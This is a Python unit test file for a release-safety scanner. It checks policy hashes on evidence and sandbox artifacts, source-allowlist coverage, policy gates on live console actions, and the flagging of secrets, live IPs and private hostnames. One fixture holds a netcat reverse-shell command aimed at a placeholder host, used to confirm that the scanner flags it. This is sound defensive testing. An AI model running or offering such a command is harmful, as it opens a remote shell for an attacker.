from __future__ import annotations

import importlib.util
import json
import sys
import tempfile
import unittest
from pathlib import Path


ROOT = Path(__file__).resolve().parents[2]
SCRIPT = ROOT / "scripts" / "check-release-safety.py"
SPEC = importlib.util.spec_from_file_location("check_release_safety", SCRIPT)
assert SPEC and SPEC.loader
check_release_safety = importlib.util.module_from_spec(SPEC)
sys.modules[SPEC.name] = check_release_safety
SPEC.loader.exec_module(check_release_safety)


class ReleaseSafetyScanTests(unittest.TestCase):
    def test_flags_runtime_artifact_path(self) -> None:
        issues = check_release_safety.scan_paths(
            ["evidence/outputs/runtime/latest-edge-appliance.json"],
            ROOT,
        )
        self.assertEqual(len(issues), 1)
        self.assertIn("runtime artifact", issues[0].message)

    def test_allows_localhost_blank_env_and_documentation_ips(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            path = root / "safe.env.example"
            path.write_text(
                "\n".join(
                    [
                        "API_KEY=",
                        "SCRAPER_HOST=",
                        "LOCAL_URL=http://localhost:5173",
                        "DOC_IP=203.0.113.10",
                        "BIND=0.0.0.0",
                    ]
                ),
                encoding="utf-8",
            )
            issues = check_release_safety.scan_paths([path.name], root)
        self.assertEqual(issues, [])

    def test_paths_only_skips_content_scan(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            path = root / "unsafe.txt"
            path.write_text("API_TOKEN=super-secret-value\n", encoding="utf-8")
            issues = check_release_safety.scan_paths([path.name], root, paths_only=True)
        self.assertEqual(issues, [])

    def test_skips_public_kve_catalog_text_scan(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            path = root / "kve.json"
            path.write_text(
                json.dumps(
                    {
                        "title": "CISA Catalog of Known Exploited Vulnerabilities",
                        "vulnerabilities": [
                            {
                                "cveID": "CVE-2017-6334",
                                "shortDescription": "Firmware through 10.0.0.50 is affected.",
                            }
                        ],
                    }
                ),
                encoding="utf-8",
            )
            issues = check_release_safety.scan_paths([path.name], root)
        self.assertEqual(issues, [])

    def test_paths_only_still_checks_release_artifact_policy_hashes(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            path = root / "evidence.json"
            path.write_text(
                json.dumps(
                    {
                        "schema_version": "prophet_evidence_bundle.v0.1",
                        "policy": {"policy_id": "fixture"},
                        "hashes": {},
                    }
                ),
                encoding="utf-8",
            )
            issues = check_release_safety.scan_paths([path.name], root, paths_only=True)
        messages = [issue.message for issue in issues]
        self.assertTrue(any("evidence bundle" in message for message in messages))
        self.assertTrue(any("policy.policy_sha256" in message for message in messages))
        self.assertTrue(any("hashes.policy_sha256" in message for message in messages))

    def test_accepts_policy_hashes_for_release_bound_json_artifacts(self) -> None:
        policy_sha = "a" * 64
        cases = {
            "evidence.json": {
                "schema_version": "prophet_evidence_bundle.v0.1",
                "policy": {"policy_sha256": policy_sha},
                "hashes": {"policy_sha256": policy_sha},
            },
            "osint.manifest.json": {
                "schema_version": "prophet.osint_snapshot_manifest.v0.1",
                "policy": {"policy_sha256": policy_sha},
            },
            "sandbox-artifact.json": {
                "schema_version": "exploit_engine_artifact.v0.1",
                "artifact_id": "ee-sandbox-edge-appliance-fixture",
                "audit": {"policy_sha256": policy_sha},
            },
            "integration-manifest.json": {
                "schema_version": "prophet_integration_export.v0.1",
                "evidence_refs": {"policy_sha256": policy_sha},
            },
            "sandbox-run-manifest.json": {
                "schema_version": "prophet.sandbox_run_manifest.v0.1",
                "policy": {"policy_sha256": policy_sha},
            },
        }
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            for name, payload in cases.items():
                (root / name).write_text(json.dumps(payload), encoding="utf-8")
            issues = check_release_safety.scan_paths(cases.keys(), root, paths_only=True)
        self.assertEqual(issues, [])

    def test_rejects_missing_policy_hashes_for_osint_sandbox_and_integration(self) -> None:
        cases = {
            "osint.manifest.json": {
                "schema_version": "prophet.osint_snapshot_manifest.v0.1",
                "policy": {"policy_id": "fixture"},
            },
            "sandbox-artifact.json": {
                "schema_version": "exploit_engine_artifact.v0.1",
                "artifact_id": "ee-sandbox-edge-appliance-fixture",
                "audit": {"run_id": "fixture"},
            },
            "integration-manifest.json": {
                "schema_version": "prophet_integration_export.v0.1",
                "evidence_refs": {"policy_id": "fixture"},
            },
            "sandbox-run-manifest.json": {
                "schema_version": "prophet.sandbox_run_manifest.v0.1",
                "policy": {"policy_id": "fixture"},
            },
        }
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            for name, payload in cases.items():
                (root / name).write_text(json.dumps(payload), encoding="utf-8")
            messages = [
                issue.message
                for issue in check_release_safety.scan_paths(
                    cases.keys(),
                    root,
                    paths_only=True,
                )
            ]
        self.assertTrue(any("OSINT manifest" in message for message in messages))
        self.assertTrue(any("sandbox artifact" in message for message in messages))
        self.assertTrue(any("integration manifest" in message for message in messages))
        self.assertTrue(any("sandbox run manifest" in message for message in messages))

    def test_accepts_enabled_source_catalog_allowlist_coverage(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            _write_catalog_allowlist_fixture(
                root,
                enabled_source_ids=["approved_source"],
                allowlisted_source_ids=["approved_source"],
            )
            issues = check_release_safety.scan_paths(
                [check_release_safety.SOURCE_CATALOG_PATH],
                root,
                paths_only=True,
            )
        self.assertEqual(issues, [])

    def test_rejects_enabled_source_without_catalog_allowlist_coverage(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            _write_catalog_allowlist_fixture(
                root,
                enabled_source_ids=["approved_source", "new_unreviewed_source"],
                allowlisted_source_ids=["approved_source"],
            )
            messages = [
                issue.message
                for issue in check_release_safety.scan_paths(
                    [check_release_safety.SOURCE_CATALOG_PATH],
                    root,
                    paths_only=True,
                )
            ]
        self.assertTrue(any("missing allowlist coverage" in message for message in messages))
        self.assertTrue(any("new_unreviewed_source" in message for message in messages))

    def test_rejects_stale_source_catalog_allowlist_entry(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            _write_catalog_allowlist_fixture(
                root,
                enabled_source_ids=["approved_source"],
                allowlisted_source_ids=["approved_source", "disabled_source"],
            )
            messages = [
                issue.message
                for issue in check_release_safety.scan_paths(
                    [check_release_safety.SOURCE_CATALOG_ALLOWLIST_PATH],
                    root,
                    paths_only=True,
                )
            ]
        self.assertTrue(any("not enabled" in message for message in messages))
        self.assertTrue(any("disabled_source" in message for message in messages))

    def test_accepts_console_live_action_with_policy_gate(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            _write_console_live_action_fixture(
                root,
                client_endpoint="/api/scraper/run",
                server_route="""
if (req.method === 'POST' && req.url === '/api/scraper/run') {
  const policyContext = await loadPilotPolicyOrRespond(res);
  if (policyContext.policy.controls.live_vm_scraper_allowed !== true) {
    writeJson(res, 403, { ok: false, status: 'policy_blocked' });
    return;
  }
}
""",
            )
            issues = check_release_safety.scan_paths(
                ["prophet-console/src/App.tsx"],
                root,
                paths_only=True,
            )
        self.assertEqual(issues, [])

    def test_rejects_console_live_action_without_policy_gate(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            _write_console_live_action_fixture(
                root,
                client_endpoint="/api/scraper/run",
                server_route="""
if (req.method === 'POST' && req.url === '/api/scraper/run') {
  writeJson(res, 200, { ok: true });
}
""",
            )
            messages = [
                issue.message
                for issue in check_release_safety.scan_paths(
                    ["prophet-console/src/App.tsx"],
                    root,
                    paths_only=True,
                )
            ]
        self.assertTrue(any("live_vm_scraper_allowed" in message for message in messages))
        self.assertTrue(any("policy_blocked" in message for message in messages))

    def test_rejects_unreviewed_console_live_action_endpoint(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            _write_console_live_action_fixture(
                root,
                client_endpoint="/api/live-collect",
                server_route="""
if (req.method === 'POST' && req.url === '/api/live-collect') {
  writeJson(res, 403, { ok: false, status: 'policy_blocked' });
}
""",
            )
            messages = [
                issue.message
                for issue in check_release_safety.scan_paths(
                    ["prophet-console/src/App.tsx"],
                    root,
                    paths_only=True,
                )
            ]
        self.assertTrue(any("release safety policy-gate allowlist" in message for message in messages))

    def test_rejects_live_ip_and_secret_value(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            path = root / "unsafe.txt"
            path.write_text(
                "API_TOKEN=super-secret-value\ncollector=8.8.8.8\n",
                encoding="utf-8",
            )
            messages = [issue.message for issue in check_release_safety.scan_paths([path.name], root)]
        self.assertTrue(any("secret assignment" in message for message in messages))
        self.assertTrue(any("IP address" in message for message in messages))

    def test_rejects_private_hostname_assignment(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            path = root / "unsafe.conf"
            path.write_text("SCRAPER_HOST=collector.internal\n", encoding="utf-8")
            messages = [issue.message for issue in check_release_safety.scan_paths([path.name], root)]
        self.assertTrue(any("endpoint assignment" in message for message in messages))
        self.assertTrue(any("private hostname" in message for message in messages))

    def test_rejects_offensive_command_text(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            path = root / "unsafe.sh"
            path.write_text("nc -e /bin/sh example.invalid 4444\n", encoding="utf-8")
            messages = [issue.message for issue in check_release_safety.scan_paths([path.name], root)]
        self.assertTrue(any("offensive command" in message for message in messages))


def _write_catalog_allowlist_fixture(
    root: Path,
    *,
    enabled_source_ids: list[str],
    allowlisted_source_ids: list[str],
) -> None:
    catalog_path = root / check_release_safety.SOURCE_CATALOG_PATH
    allowlist_path = root / check_release_safety.SOURCE_CATALOG_ALLOWLIST_PATH
    catalog_path.parent.mkdir(parents=True, exist_ok=True)
    allowlist_path.parent.mkdir(parents=True, exist_ok=True)

    sources = [{"id": source_id, "enabled": True} for source_id in enabled_source_ids]
    sources.append({"id": "disabled_source", "enabled": False})
    catalog_path.write_text(
        json.dumps(
            {
                "schema_version": check_release_safety.SOURCE_CATALOG_SCHEMA_VERSION,
                "sources": sources,
            },
            indent=2,
            sort_keys=True,
        )
        + "\n",
        encoding="utf-8",
    )
    allowlist_path.write_text(
        json.dumps(
            {
                "schema_version": check_release_safety.SOURCE_CATALOG_ALLOWLIST_SCHEMA_VERSION,
                "allowed_enabled_source_ids": allowlisted_source_ids,
            },
            indent=2,
            sort_keys=True,
        )
        + "\n",
        encoding="utf-8",
    )


def _write_console_live_action_fixture(
    root: Path,
    *,
    client_endpoint: str,
    server_route: str,
) -> None:
    app_path = root / "prophet-console/src/App.tsx"
    server_path = root / check_release_safety.CONSOLE_CONTROL_SERVER_PATH
    app_path.parent.mkdir(parents=True, exist_ok=True)
    server_path.parent.mkdir(parents=True, exist_ok=True)
    app_path.write_text(
        f"""
export function App() {{
  return <button onClick={{() => fetch(`${{CONTROL_ORIGIN}}{client_endpoint}`, {{ method: 'POST' }})}}>
    Run live collection
  </button>;
}}
""",
        encoding="utf-8",
    )
    server_path.write_text(server_route, encoding="utf-8")


if __name__ == "__main__":
    unittest.main()
